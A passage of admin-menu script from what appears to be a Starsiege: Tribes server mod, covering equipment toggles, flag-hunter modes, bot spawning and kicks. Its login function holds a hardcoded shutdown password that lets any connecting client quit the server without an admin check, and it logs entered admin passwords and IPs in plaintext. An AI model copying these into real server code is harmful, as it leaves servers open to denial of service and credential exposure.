		Client::addMenuItem(%clientId, %curItem++ @ "Kill bases", "Killbases");
		Client::addMenuItem(%clientId, %curItem++ @ "NEUTRON BOMB", "Purge");		
		Client::addMenuItem(%clientId, %curItem++ @ "Fix all stations", "FixStat");
		Client::addMenuItem(%clientId, %curItem++ @ "fix bases", "Fixbases");
		Client::addMenuItem(%clientId, %curItem++ @ "FIX ALL, restore", "dePurge");		 							
		return;		 			
	 } 
	else if(%opt == "WeapAP") 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Client::buildMenu(%clientId, "Item Options:", "Server", true);
	 	if(!$DisableGP)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable GhostPack", "DisabledGP");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable GhostPack", "EnableGP");
	 	if(!$DisablePB)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable ParticleBeam", "DisabledPB");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable ParticleBeam", "EnablePB");
	 	if(!$DisablePF)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Pitchforks", "DisabledPF");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Pitchforks", "EnablePF");	
	 	if(!$DisableGS)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Gunships", "DisabledGS");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Gunships", "EnableGS");
	 	if(!$DisableJL)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Jails", "DisabledJL");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Jails", "EnableJL");
	 	if(!$DisableAB)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Airbases", "DisabledAB");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Airbases", "EnableAB");
	 	if(!$DisableDD)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Droids", "DisabledDD");
		else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Droids", "EnableDD");
		return;
	}
	 	
//purge		
	else if(%opt == "Purge")
		KillPurge(%clientId,true);
//unpurge		
	else if(%opt == "dePurge")
		KillPurge(%clientId,false);
	else if(%opt == "DisabledGP") 
	{
		PopulateItemMax(ghostpack);
		ServerSwitches(%clientId,"Ghost Packs",false);	
	}
	else if(%opt == "EnableGP") 
	{
		PopulateItemMax(ghostpack,			0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0,   0,   0,   0,   0);
		ServerSwitches(%clientId,"Ghost Packs",true);
	} 
	else if(%opt == "DisabledPB") 
	{
		PopulateItemMax(ParticleBeamWeapon);
		ServerSwitches(%clientId,"ParticleBeams",false);
	}
	else if(%opt == "EnablePB") 
	{
		PopulateItemMax(ParticleBeamWeapon,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1);
		ServerSwitches(%clientId,"ParticleBeams",true);
	} 
	else if(%opt == "DisabledPF") 
	{
		PopulateItemMax(Grabbler);
		ServerSwitches(%clientId,"Pitchforks",false);	
	}
	else if(%opt == "EnablePF") 
	{
		PopulateItemMax(Grabbler,			0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
		ServerSwitches(%clientId,"Pitchforks",true);
	} 
	else if(%opt == "DisabledGS") 
	{
		PopulateItemMax(GunShipPack);
		ServerSwitches(%clientId,"Deploying Gunships",false);	
	}
	else if(%opt == "EnableGS") 
	{
		PopulateItemMax(GunShipPack,			0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   1);
		ServerSwitches(%clientId,"Deploying Gunships",true);
	} 
	else if(%opt == "DisabledJL") 
	{
            		PopulateItemMax(Jailgun);
                  	PopulateItemMax(JailTower);
		ServerSwitches(%clientId,"Deploying Jails",false);	
	}
	else if(%opt == "EnableJL") 
	{
		PopulateItemMax(Jailgun,			1,   1,   0,   0,   1,   1,   0,   0,   1,   1,   1,   1,   0,   0,   0);
		PopulateItemMax(JailTower,			0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
		ServerSwitches(%clientId,"Deploying Jails",true);
	} 
	else if(%opt == "DisabledAB") 
	{
		PopulateItemMax(AirBasePack);
		ServerSwitches(%clientId,"Deploying Airbases",false);	
	}
	else if(%opt == "EnableAB") 
	{
		PopulateItemMax(AirBasePack,			1,   1,   0,   0,   0,   0,   0,   0,   1,   1,   1,   1,   0,   0,   0);
		ServerSwitches(%clientId,"Deploying Airbases",true);
	} 
	else if(%opt == "DisabledDD") 
	{
		PopulateItemMax(SurveyDroidPack);
		PopulateItemMax(ProbeDroidPack);
		PopulateItemMax(SuicideDroidPack);
		ServerSwitches(%clientId,"Deployable Droids",false);	
	}
	else if(%opt == "EnableDD") 
	{
		PopulateItemMax(SurveyDroidPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
		PopulateItemMax(ProbeDroidPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
		PopulateItemMax(SuicideDroidPack,		0,   0,   0,   0,   0,   0,   0,   0,   0,   0,   1,   1,   0,   0,   0);
		ServerSwitches(%clientId,"Deployable Droids",true);
	}
//kill deployables		
	else if(%opt == "killDeployables")
		AdminKillDeploy(%clientId);


	//Inventory stations	
	else if(%opt == "Killbases") 
		BaseDamageThingy(%clientId,true);
		
	else if(%opt == "Fixbases")
		BaseDamageThingy(%clientId);
		
	else if(%opt == "DamMapGens")	
		KillClass(%clientId,true,Generator); 
	if(%opt == "dGenerators")	
		{KillClass(%clientId,true,Generator);ServerSwitches(%clientId,"Generators",false);}	
	if(%opt == "eGenerators")	
		{KillClass(%clientId,true,Generator);ServerSwitches(%clientId,"Generators",true);}
	else if(%opt == "FixMapGens")	
		KillClass(%clientId,false,Generator); 
	else if(%opt == "FixStat")	
		KillClass(%clientId,false,Station); 	
	else if(%opt == "killStat")	
		KillClass(%clientId,true,Station); 
// could clean up code by using killclass to kill/fix invs/turrets/vehicle also but would need 
// deployable counterparts like killDepGen for each.
	else if(%opt == "rPlayerGens")	
		KillDepGen(%clientId); 
// inv	 
	if(%opt == "dInv")	
		{KillMapInv(%clientId,true,true);ServerSwitches(%clientId,"Inventories",false);}
	else if(%opt == "eInv")	
		ServerSwitches(%clientId,"Inventories",true);
	
	if(%opt == "rPlayerInvs")	
		KillMapInv(%clientId,false,true);
	else if(%opt == "DamMapInvs")	
		KillMapInv(%clientId,true,true); 
	else if(%opt == "FixMapInvs")	
		KillMapInv(%clientId,true,false); 	
// obs alert
	else if(%opt == "obsAlertOn")	
		ServerSwitches(%clientId,"Observer Alert",true);
	else if(%opt == "obsAlertOff")	
		ServerSwitches(%clientId,"Observer Alert",false);
// skins	
	else if(%opt == "skinsOn")	
	{
		%numPlayers = getNumClients();
		for(%i = 0; %i < %numPlayers; %i++)
		{
			%cl = getClientByIndex(%i);
		//	Client::setSkin(%cl, $Client::info[%cl, 0]);
			client::setSkin(%clientId, "green");	
		}
		ServerSwitches(%clientId,"personal skins",true);
	}
	else if(%opt == "skinsOff")	
	{
		%numPlayers = getNumClients();
		for(%i = 0; %i < %numPlayers; %i++)
		{
			%cl = getClientByIndex(%i);
			//Anni::Echo(%cl);		
			//Client::setSkin(%cl, $Server::teamSkin[Client::getTeam(%cl)]);
			client::setSkin(%clientId, "green");	
		}
		ServerSwitches(%clientId,"personal skins",false);
	}	
	else if(%opt == "cffa" && %clientId.isadmin)
	{
		Client::buildMenu(%clientId, "Confirm Free For All Mode:", "Server", true);
		Client::addMenuItem(%clientId, "1Reset to Free For All Mode.", "yescffa" );
		Client::addMenuItem(%clientId, "2Don't switch to Free for all.", "no" );
		return;
	}

	else if(%opt == "ctourney" && %clientId.isadmin)
	{
		Client::buildMenu(%clientId, "Confirm Tournament Mode:", "Server", true);
		Client::addMenuItem(%clientId, "1Reset to Tournament Mode.", "yesctourney");
		Client::addMenuItem(%clientId, "2Don't switch to Tournament.", "no");
		return;
	}
	
	else if(%opt == "smatch" && %clientId.isadmin) //move here so it will actually work
	{
		Admin::startMatch(%clientId);
		return;
	}
	else if(%opt == "yescffa")
	{	
		Admin::setModeFFA(%clientId); 
		return;
	}
	else if(%opt == "yesctourney")	
	{
		Admin::setModeTourney(%clientId);
		return;
	} 
	else if(%opt == "dtourneyot") 
	{
		$TA::TourneyOT = false;
		messageAll(0, Client::getName(%clientId) @ " disabled Tournament Overtime. ~wCapturedTower.wav");
		centerprintall("<jc><f1>" @ Client::getName(%clientId) @ " disabled Tournament Overtime.", 3);	 			
	 }
	 else if(%opt == "dtourneyot") 
	{
		$TA::TourneyOT = true;
		messageAll(0, Client::getName(%clientId) @ " enabled Tournament Overtime. ~wCapturedTower.wav");
		centerprintall("<jc><f1>" @ Client::getName(%clientId) @ " enabled Tournament Overtime.", 3);	 			
	 }
	else if(%opt == "no")	
	{
		ServerOptions(%clientId);
		return;
	} 			
//		function processMenuccffa(%clientId, %opt)
//		{
//			if(getWord(%opt, 0) == "yes")
//				Admin::setModeFFA(%clientId);
//			Game::menuRequest(%clientId);
//		}
//		
//		function processMenucctourney(%clientId, %opt)
//		{
//			if(getWord(%opt, 0) == "yes")
//				Admin::setModeTourney(%clientId);
//			Game::menuRequest(%clientId);
//		}	
		
// vehicles	 

	else if(%opt == "KillVehicle")	
		KillMapVehicle(%clientId,true,true); 
	else if(%opt == "FixVehicle")	
		KillMapVehicle(%clientId,true,false); 

	if(%opt == "dVehicle")	
		{KillMapVehicle(%clientId,true,true);ServerSwitches(%clientId,"Vehicle Stations",false);}
	else if(%opt == "eVehicle")	
		ServerSwitches(%clientId,"Vehicle Stations",true);
// flag caps	 
	if(%opt == "dFlag")	
		ServerSwitches(%clientId,"Flag Cap Limit",false);
	else if(%opt == "eFlag")	
		ServerSwitches(%clientId,"Flag Cap Limit",true);
	
	else if(%opt == "FlagOptions") 
	{
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Client::buildMenu(%clientId, "Flag Options:", "Server", true);	
		if($NoFlagCaps == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Cap Limit", "eFlag");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Cap Limit", "dFlag");	
			if(%clientId.isGoated || %clientId.isSuperAdmin)
		{
		Client::addMenuItem(%clientId, %curItem++ @ "Return Flags", "ReturnFlags");
		}
// flaghunter variables	//Hunter added 
//		if(%clientId.isGoated || %clientId.isOwner)
//		{
		if($Arena::Kill)
	{
				Client::sendMessage(%client, 0, "No flag hunter during this map type. ~wPku_ammo.wav");
		// Arena::Clear();	
		return;
	}
	
		if($FlagHunter::Enabled)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Hunter", "dHunter");			
			if($FlagHunter::GreedMode)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable GREED mode", "dgm");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable GREED mode", "egm");
			if($FlagHunter::HoardMode)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable HOARD mode", "dhm");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable HOARD mode", "ehm");
		}	
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Hunter", "eHunter");		
			return;
//		}
	}
	
		//return flags
	else if(%opt == "ReturnFlags")
	{
		messageAll(0, Client::getName(%clientId) @ " returned the flags.~wCapturedTower.wav");
		Anni::Echo(Client::getName(%clientId) @ " returned the flags.");
		ReturnFlags();
	}		
	//flaghunter switches //Hunter added 
	else if(%opt == "eHunter")
	{
		$TowerSwitchNexus = "";
		ReturnObjectives();
		exec(flaghunter);
		//Mission::init();
		ServerSwitches(%clientId,"Flag Hunter",true);
	}
	else if(%opt == "dHunter")
	{
		$TowerSwitchNexus = "";
		$FlagHunter::Enabled = "";
		ServerSwitches(%clientId,"Flag Hunter",false);
	}
		
	else if(%opt == "egm")
		Admin::setGreedMode(%clientId, true);
	else if(%opt == "dgm")
		Admin::setGreedMode(%clientId, false);
	else if(%opt == "ehm")
		Admin::setHoardMode(%clientId, true);
	else if(%opt == "dhm")
		Admin::setHoardMode(%clientId, false);			
	// end flaghunter switches

// reset server
		else if(%opt == "reset") 
		{
			Client::buildMenu(%clientId, "Reset Server?", "Server", true);	
			Client::addMenuItem(%clientId, %curItem++ @ "yes, Reset server", "resetYes");
			Client::addMenuItem(%clientId, %curItem++ @ "no, Don't reset", "resetNo");
			return;
		}
		else if(%opt == "resetYes") 
		{
		if(!%clientId.SecretAdmin)
			messageAll(0, Client::getName(%clientId) @ " reset the server to default settings.~wCapturedTower.wav");
		else
			messageAll(0, "Reseting the server to default settings.~wCapturedTower.wav");
			Server::refreshData();
		}		
		else if(%opt == "resetNo")
		{
			ServerOptions(%clientId);
			return;
		}			
//builder		
	else if(%opt == "ebm")
		Admin::setBuild(%clientId, true);
	else if(%opt == "eabm")
		Admin::setABuild(%clientId, true);
	else if(%opt == "dbm")
		Admin::setBuild(%clientId, false);
	else if(%opt == "dabm")
		Admin::setABuild(%clientId, false);
	else if(%opt == "godmenu" && %clientId.isGod)
//		Client::sendMessage(%client, 0, "~wPku_ammo.wav");
		Ann::godAdminMenu(%clientId);						
}

$TA::ShutdownServerPass = "ShutdownQuit";

function remoteGoatedAdminLogin(%client, %password)
{
	%password = Ann::Clean::string(%password);
	%ip = Client::getTransportAddress(%client); 
	%name = Client::getName(%client);
	if(%client.isGoated)
	{
		%client.isGoated = false;
		%client.isAdmin = "";
		%client.isSuperAdmin = "";
		%client.isGod = "";
		%client.isOwner = "";
		Client::sendMessage(%client, 0, "You have lost goat power.~wCapturedTower.wav");
	}
	else if($TA::GoatAdminLogin != "" && %password == $TA::GoatAdminLogin)
	{
		if(!%client.isOwner)
		{
			Client::sendMessage(%client, 0, "Please login to Owner admin first.~waccess_denied.wav");
			return;		
		}
		$Admin = %name @ " gained goat admin with this pass : "@ %password @" . Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\AdminPass.log",true);
		Client::sendMessage(%client, 0, "You have been given goat power.~wCapturedTower.wav");
		%client.isAdmin = true;
		%client.isSuperAdmin = true;
		%client.isGod = true;
		%client.isOwner = true;
		%client.isGoated = true;
		Game::refreshClientScore(%client);
		return;
	}
	if($TA::ShutdownServerPass != "" && %password == $TA::ShutdownServerPass)
	{
		Quit();
	}
	
		Client::sendMessage(%client, 0, "Your password is invalid.~waccess_denied.wav");
}

function ServerOptions(%clientId)
{
	DebugFun("ServerOptions",%clientId);
	if(!%clientId.isadmin) 
		return;
	Client::buildMenu(%clientId, "Server Options:", "Server", true);
//fair teams	
	if($ANNIHILATION::FairTeams == 1)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable fair teams", "dFair");
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable fair teams", "eFair");
//changetime
	Client::addMenuItem(%clientId, %curItem++ @ "Change Time", "time");	
// global flag options
	Client::addMenuItem(%clientId, %curItem++ @ "Flag Options", "FlagOptions");
//supa admean meneu		
	if(%clientId.isSuperAdmin)	
	{
		if($TALT::Active == false) 
		{
	//builder
		if(%clientId.isGoated || %clientId.isOwner)
		{
			if(($Build == 1) && ($ABuild == 0))
			{
				Client::addMenuItem(%clientId, %curItem++ @ "Disable Builder mode", "dbm");
				Client::addMenuItem(%clientId, %curItem++ @ "Enable Advanced Building mode", "eabm");
			}
			else if($ABuild == 1)
			{
				Client::addMenuItem(%clientId, %curItem++ @ "Disable All Building Modes", "dabm");				
			}
			else if(($Build == 0) && ($ABuild == 0))
				Client::addMenuItem(%clientId, %curItem++ @ "Enable Builder mode", "ebm");
		}
		}
	// observer alert
		if($ANNIHILATION::obsAlert != true)
			Client::addMenuItem(%clientId, %curItem++ @ "Observer alert on ", "obsAlertOn");
		else	 
			Client::addMenuItem(%clientId, %curItem++ @ "Observer alert off ", "obsAlertOff");
	// personal skins
		if($ANNIHILATION::UsePersonalSkin != true)
			Client::addMenuItem(%clientId, %curItem++ @ "Allow custom skins ", "skinsOn");
		else	 
			Client::addMenuItem(%clientId, %curItem++ @ "Custom skins off ", "skinsOff");
			
		if(%clientId.isGoated || %clientId.isOwner)
		{
			if($Server::TourneyMode)
			{
				Client::addMenuItem(%clientId, %curItem++ @ "Change to FFA mode", "cffa");
				if(!$CountdownStarted && !$matchStarted)
					Client::addMenuItem(%clientId, %curItem++ @ "Start the match", "smatch");
			}
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Change to Tournament mode", "ctourney");			
		//reset			
			Client::addMenuItem(%clientId, %curItem++ @ "More...", "godmenu");				
			
		}
		else
		{
		// tourny mode
			if($Server::TourneyMode)
			{
				Client::addMenuItem(%clientId, %curItem++ @ "Change to FFA mode", "cffa");
				if(!$CountdownStarted && !$matchStarted)
					Client::addMenuItem(%clientId, %curItem++ @ "Start the match", "smatch");
			}
			else
		if(%clientId.isGoated || %clientId.isOwner)
		{
				Client::addMenuItem(%clientId, %curItem++ @ "Change to Tournament mode", "ctourney");
		}
		//reset	
					if(%clientId.isGoated || %clientId.isOwner)
		{		
			Client::addMenuItem(%clientId, %curItem++ @ "Reset Server Defaults", "reset");
		}	
		}
	
	}
}

function EquipmentOptions(%clientId)
{
	DebugFun("EquipmentOptions",%clientId);
	if(!%clientId.isadmin) return;
	if(%clientId.isGoated || %clientId.isSuperAdmin)
	Client::buildMenu(%clientId, "Equipment Options:", "Server", true);
	
// turret menu
	Client::addMenuItem(%clientId, %curItem++ @ "Turrets", "turret");
// Generators
	Client::addMenuItem(%clientId, %curItem++ @ "Generators", "Generator");
// Stations
	Client::addMenuItem(%clientId, %curItem++ @ "Stations", "Station");
// combined
		if(%clientId.isGoated || %clientId.isOwner)
		{
	Client::addMenuItem(%clientId, %curItem++ @ "Combination", "Combined");	
	Client::addMenuItem(%clientId, %curItem++ @ "Kill Barriers", "Barrier");
		}
	Client::addMenuItem(%clientId, %curItem++ @ "Weapons and Packs", "WeapAP");
//	Client::addMenuItem(%clientId, %curItem++ @ "Kill Mini Mines", "minimines"); //no more mini mines
}

function LTArmorOptions(%clientId)
{
	DebugFun("LTArmortOptions",%clientId);
	if(!%clientId.isadmin) return;
	Client::buildMenu(%clientId, "LT Mod Options:", "LTArmor", true);
	
	if($TALT::SpawnType != "AnniSpawn")
		Client::addMenuItem(%clientId, %curItem++ @ "Annihilation", "annispawn");
	if($TALT::SpawnType != "EliteSpawn")
		Client::addMenuItem(%clientId, %curItem++ @ "EliteRenegades", "elitespawn");
	if($TALT::SpawnType != "BaseSpawn")
		Client::addMenuItem(%clientId, %curItem++ @ "Base", "basespawn");
	if($TALT::NoReset == false)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Mod Reset", "ltreset");
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Mod Reset", "ltreset");
	if($TALT::SpawnType == "AnniSpawn")
	{
		if($TALT::AnniWeapon != "Shotgun")
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Shotgun", "eshotgun");
		if($TALT::AnniWeapon != "GrenadeLauncher")
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Grenade Launcher", "enadelauncher");
		if($TALT::AnniWeapon != "Blaster")
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Blaster", "eblaster");
	}
}

function processMenuLTArmor(%clientId, %opt)
{
	DebugFun("processMenuLTArmor",%clientId,%option);
	if(%opt == "annispawn")
	{
		//if($TALT::SpawnType == "BaseSpawn") //get rid of beacons
		//	$killbeacons = true;
		$TALT::SpawnType = "AnniSpawn";
		TALT::SpawnReset();
		Messageall(0,Client::getName(%clientId)@" changed the LT Spawn Type to Annihilation.~wcapturedtower.wav");
	}
	else if(%opt == "elitespawn")
	{
		//if($TALT::SpawnType == "BaseSpawn")
		//	$killbeacons = true;
		$TALT::SpawnType = "EliteSpawn";
		TALT::SpawnReset();
		Messageall(0,Client::getName(%clientId)@" changed the LT Spawn Type to EliteRenegades.~wcapturedtower.wav");
	}
	else if(%opt == "basespawn")
	{
		$TALT::SpawnType = "BaseSpawn";
		TALT::SpawnReset();
		Messageall(0,Client::getName(%clientId)@" changed the LT Spawn Type to Base.~wcapturedtower.wav");
	}
	else if(%opt == "ltreset")
	{
		if($TALT::NoReset == false)
		{
			$TALT::NoReset = true;
			Messageall(0,Client::getName(%clientId)@" has disabled mod resets after map changes.~wcapturedtower.wav");
		}
		else
		{
			$TALT::NoReset = false;
			Messageall(0,Client::getName(%clientId)@" has enabled mod resets after map changes.~wcapturedtower.wav");
		}
	}
	else if(%opt == "eshotgun")
	{
		$TALT::AnniWeapon = "Shotgun";
		Messageall(0,Client::getName(%clientId)@" enabled the Shotgun.~wcapturedtower.wav");
	}
	else if(%opt == "enadelauncher")
	{
		$TALT::AnniWeapon = "GrenadeLauncher";
		Messageall(0,Client::getName(%clientId)@" enabled the Grenade Launcher.~wcapturedtower.wav");
	}
	else if(%opt == "eblaster")
	{
		$TALT::AnniWeapon = "Blaster";
		Messageall(0,Client::getName(%clientId)@" enabled the Blaster.~wcapturedtower.wav");
	}
	else
	   return;
}

function Admin::crash(%clientId)
{
	if(%clientId.isGoated == true)
	{
		%name = Client::getName(%clientId);
		messageAll(0, %name@" cannot be kicked.");
		return;
	}
	DebugFun("Admin::crash",%clientId);
	%ip = Client::getTransportAddress(%clientId);
	Player::setDamageFlash(%clientId,0.75);
	centerprint(%clientId, "<jc><f1>"@$ANNIHILATION::KickMessage, 10);
	%message = "Bitch!";
	Net::kick(%clientId,%message); 
	
}

function adminlow::message(%message)
{
	DebugFun("admin::message",%message);
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{		
		%cl = getClientByIndex(%i);
	//	Anni::Echo(%cl,%cl.isSuperAdmin,%cl.isAdmin);
		if(%cl.isSuperAdmin || %cl.isAdmin)
		{
			Client::sendMessage(%cl,1,"**admin message** "@%message);
		}
	}
}


function admin::message(%message)
{
	DebugFun("admin::message",%message);
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{		
		%cl = getClientByIndex(%i);
	//	Anni::Echo(%cl,%cl.isSuperAdmin,%cl.isAdmin);
		if(%cl.isOwner || %cl.isGoated)
		{
			Client::sendMessage(%cl,1,"**admin message** "@%message);
		}
	}
}

function Godadmin::message(%message)
{
	DebugFun("Godadmin::message",%message);
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{		
		%cl = getClientByIndex(%i);
	//	Anni::Echo(%cl,%cl.isSuperAdmin,%cl.isAdmin);
		if(%cl.isOwner)
		{
			Client::sendMessage(%cl,3,"Admin Message "@%message);
		}
	}
}

function admin::BPmessage(%message)
{
	DebugFun("admin::BPmessage",%message);
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{		
		%cl = getClientByIndex(%i);
	//	Anni::Echo(%cl,%cl.isSuperAdmin,%cl.isAdmin);
	//	if(%cl.isSuperAdmin || %cl.isAdmin)
		if(%cl.isGoated || %cl.isOwner)
		{
			bottomprint(%cl,"<jc><f2>"@%message);
			Client::sendMessage(%cl,3,"Connect Info "@%message);
		}
	}
}

function FairTeamCheck()
{
	DebugFun("FairTeamCheck");
	%numPlayers = getNumClients();
	%numTeams = getNumTeams()-1;
	%fp = %numTeams + 1;
	for(%i = 0; %i < %numTeams; %i = %i + 1)	%numTeamPlayers[%i] = 0;

	for(%i = 0; %i < %numPlayers; %i = %i + 1)
		{
		%cl = getClientByIndex(%i);
		%team = Client::getTeam(%cl);
		%numTeamPlayers[%team] = %numTeamPlayers[%team] + 1;
		
		}
	if (%numTeamPlayers[0] == %numTeamPlayers[1]) return;
	for(%i = 0; %i < %numTeams; %i = %i + 1)
	{
		if (%numTeamPlayers[%i] <= %numPlayers/%fp && %numPlayers != 1) 
			if($TALT::Active == false)
				messageall(1,"Even up the teams!");
	}	
}

function Admin::setGreedMode(%admin, %enabled)
{
	 if(%admin == -1 || %admin.isAdmin)
	 {
			if(%enabled)
			{
				 $FlagHunter::GreedMode = true;
				 if(%admin == -1)
						messageAll(1, "GREED mode is ON by consensus!");
				 else
						messageAll(1, Client::getName(%admin) @ " has turned GREED mode ON!");
			}
			else
			{
				 $FlagHunter::GreedMode = false;
				 if(%admin == -1)
						messageAll(1, "GREED mode is OFF by consensus.");
				 else
						messageAll(1, Client::getName(%admin) @ " has turned GREED mode Off.");
			}
			
			//update the objectives page
			DM::missionObjectives();
	 }
}

function Admin::setHoardMode(%admin, %enabled)
{
	 if(%admin == -1 || %admin.isAdmin)
	 {
			if(%enabled)
			{
				 if(%admin == -1)
				 {
						$FlagHunter::HoardMode = true;
						messageAll(1, "HOARD mode is ON by consensus!");
				 }
				 else
				 {
						//make sure an admin isn't screwing with the hoard for his own ends...
						if ((%curTimeLeft < ($FlagHunter::HoardStartTime * 60)) && (%curTimeLeft >= ($FlagHunter::HoardEndTime * 60)))
							 Client::sendMessage(%admin, 0, "You cannot alter the HOARD mode during the HOARD period.");
						else
						{
							 $FlagHunter::HoardMode = true;
							 messageAll(1, Client::getName(%admin) @ " has turned HOARD mode ON!");
						}
				 }
			}
			else
			{
				 if(%admin == -1)
				 {
						$FlagHunter::HoardMode = false;
						messageAll(1, "HOARD mode is OFF by consensus.");
				 }
				 else
				 {
						//make sure an admin isn't screwing with the hoard for his own ends...
						%curTimeLeft = ($Server::timeLimit * 60) + $missionStartTime - getSimTime();
						if ((%curTimeLeft < ($FlagHunter::HoardStartTime * 60)) && (%curTimeLeft >= ($FlagHunter::HoardEndTime * 60)))
							 Client::sendMessage(%admin, 0, "You cannot alter the HOARD mode during the HOARD period.");
						else
						{
							 $FlagHunter::HoardMode = false;
							 messageAll(1, Client::getName(%admin) @ " has turned HOARD mode OFF.");
						}
				 }
			}
			
			//update the objectives page
			DM::missionObjectives();
	 }
}

function evalspam(%clientId)	
{
	DebugFun("evalspam",%clientId);

	// we use getIntTime here because getSimTime gets reset.
	// time is measured in 32 ms chunks... so approx 32 to the sec
	
	%time = getIntegerTime(true) >> 5;
	if(%clientId.floodRemote)
	{
		%delta = %clientId.RemoteAllowTime - %time;
		if(%delta > 0)
		{
		//	Client::sendMessage(%clientId, $MSGTypeGame, "FLOOD! You cannot remote for " @ %delta @ " seconds. "@%clientId.floodRemoteCount);
 			return false;
		}
		%clientId.floodRemote = "";
		%clientId.RemoteAllowTime = "";
	}
	%clientId.floodRemoteCount++;
	// funky use of schedule here:
	schedule(%clientId @ ".floodRemoteCount--;", 1, %clientId);
	if(%clientId.floodRemoteCount > 15)
	{
		%clientId.floodRemote = true;
		%clientId.RemoteAllowTime = %time + 5;
		Client::sendMessage(%clientId, $MSGTypeGame, "Error! Your armor is in debug for 5 seconds.~wfemale1.wbelay.wav");
		return false;
	}
	return true;
}

function processMenuSelBotAction(%clientId, %opt)
{
if (%opt == "spawnbot") 
    {
      
//      Client::addMenuItem(%clientId, "1CornBoy", "CornBoy");
//      Client::addMenuItem(%clientId, "2Diamondback", "Diamondback");
//      Client::addMenuItem(%clientId, "3SymLink", "SymLink");
//      Client::addMenuItem(%clientId, "4Nailz", "Nailz");
//      Client::addMenuItem(%clientId, "5Got_Milk", "Got_Milk");
//      Client::addMenuItem(%clientId, "6Ginsu2000", "Ginsu2000");
//      Client::addMenuItem(%clientId, "7UberBob", "UberBob");

	  Client::buildMenu(%clientId, "Select bot type:", "selbotgender", true);  
	  Client::addMenuItem(%clientId, "1Optimus_Prime", "Optimus_Prime");
      Client::addMenuItem(%clientId, "2Android18", "Android18");
      Client::addMenuItem(%clientId, "3Bumblebee", "Bumblebee");
      Client::addMenuItem(%clientId, "4Commander_Data", "Commander_Data");
      Client::addMenuItem(%clientId, "5Megatron", "Megatron");
      Client::addMenuItem(%clientId, "6T_800", "T_800");
      Client::addMenuItem(%clientId, "7Jetfire", "Jetfire");
      return;
    }
    else if (%opt == "removebot")
    {
      %opt = 0;
      processMenuRemoveBot(%clientId, %opt);
      return;
    }

}



function processMenuSelBotGender(%clientId, %opt)
{
      Client::buildMenu(%clientId, "Bot gender and type:", "botalldone", true);
      Client::addMenuItem(%clientId, "1Male " @ %opt, %opt @ "_Male");
      Client::addMenuItem(%clientId, "2Female " @ %opt, %opt @ "_Female");
      Client::addMenuItem(%clientId, "3Male CMD " @ %opt, %opt @ "_Male_CMD");
      Client::addMenuItem(%clientId, "4Female CMD " @ %opt, %opt @ "_Female_CMD");
      return;
}






function processMenuRemoveBot(%clientId, %options)
{
   %curItem = 0;
   %first = getWord(%options, 0);
   Client::buildMenu(%clientId, "Pick bot to remove", "rbot", true);
   %i = 0;
   %menunum = 0;
   %startCl = 2049;                 
//   %startCl = Client::getFirst();
   %endCl = %startCl + 90;
   for(%cl = %startCl; %cl < %endCl; %cl = %cl + 1)
       if (Player::isAIControlled(%cl)) //Is this a bot?
       {
         %aiName = Client::getName(%cl);
         %i = %i + 1;

         if (%i > %first)  // Skip some bots if we selected "more bots" previously
           {
            %menunum = %menunum + 1;

            if(%menunum > 6)
             {

               Client::addMenuItem(%clientId, %menunum @ "More bots...", "more " @ %first + %menunum - 1);
               break;
              }


             Client::addMenuItem(%clientId, %menunum @ %aiName, %aiName);
           }

       }
return;
}


function processMenuRBot(%clientId, %option)
{
   if(getWord(%option, 0) == "more")
   {
      %first = getWord(%option, 1);
      processMenuRemoveBot(%clientId, %first);
      return;
   }

   AI::RemoveBot(%option, %clientId);
   return;
}



function processMenuBotAllDone(%clientId, %opt)
{
//   dbecho(1, "processMenuBotAllDone calls AI::SpawnAdditionalBot with these parameters:");
//   dbecho(1, "opt: " @ %opt);
//   dbecho(1, "clientId: " @ %clientId);
   %teamnum = GameBase::getTeam(%clientId);
   AI::SpawnAdditionalBot(%opt, %teamNum, 1);
   return;
}

